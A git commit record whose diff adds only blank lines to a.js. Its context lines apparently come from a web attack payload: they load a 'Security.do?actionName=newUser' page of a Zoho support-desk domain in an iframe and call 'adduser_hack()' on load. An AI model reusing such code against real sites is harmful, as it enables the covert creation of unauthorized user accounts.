973993583a4aeca1b07ce3f69f59433ecece512d
Nandha30 <mail.nandha30@gmail.com>
2016-09-23 13:10:00 +0530

    Update a.js
    dfs

--- a.js
+++ a.js
@@ -3,7 +3,9 @@
 var iframe = jQuery("<iframe></iframe>");
 jQuery(iframe).attr("src","Security.do?actionName=newUser&frameorigin=https://supportdesk.localzoho.com");
 jQuery(iframe).attr("onload","adduser_hack()");
+
 jQuery("body").append(iframe);
+
 
 
 
